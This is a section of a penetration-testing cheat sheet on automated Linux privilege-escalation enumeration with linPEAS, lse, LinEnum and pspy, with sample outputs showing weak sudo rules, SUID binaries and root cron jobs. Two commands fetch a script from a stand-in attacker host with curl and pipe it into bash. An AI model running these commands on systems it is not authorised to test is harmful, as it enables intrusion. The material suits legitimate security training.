# AUTOMATED ENUMERATION

### Run linPEAS

Most comprehensive auto-enum — Highlights privesc vectors in color

```bash
curl http://ATTACKER_IP/linpeas.sh | bash
or: ./linpeas.sh | tee linpeas_output.txt
```

<details>
<summary>Example Output</summary>

```
linpeas output (color coded):
[+] Possible sudo pwnage:
  (root) NOPASSWD: /usr/bin/vim
[+] SUID files:
  /usr/bin/pkexec
[+] Writable cron scripts:
  /opt/backup.sh
```
</details>

---

### Run linux-smart-enumeration

Alternative to linPEAS — Different perspective

```bash
curl http://ATTACKER_IP/lse.sh | bash
```

<details>
<summary>Example Output</summary>

```
./lse.sh
[!] usr010 Can we read /etc/shadow?... yes!
[!] fst020 Uncommon setuid binaries... /opt/custom_app
[!] ctn000 Is the user in a docker group?... yes!
(Different checks than linPEAS, use both)
```
</details>

---

### Run LinEnum

Thorough mode — Classic enum script

```bash
bash LinEnum.sh -t
```

<details>
<summary>Example Output</summary>

```
bash LinEnum.sh -t
[+] Current user/group info:
uid=33(www-data)
[+] Possible sudo pwnage:
/usr/bin/vi
[+] SUID files:
/usr/bin/pkexec
```
</details>

---

### pspy (process snooping)

Watch processes without root — Catch cron jobs and background tasks

```bash
./pspy64
./pspy32
```

<details>
<summary>Example Output</summary>

```
./pspy64
2026/02/24 10:00:01 CMD: UID=0 PID=1234 /bin/bash /opt/cleanup.sh
2026/02/24 10:05:01 CMD: UID=0 PID=1235 /usr/bin/python3 /root/backup.py
(Root cron jobs revealed that aren't in crontab)
```
</details>

---
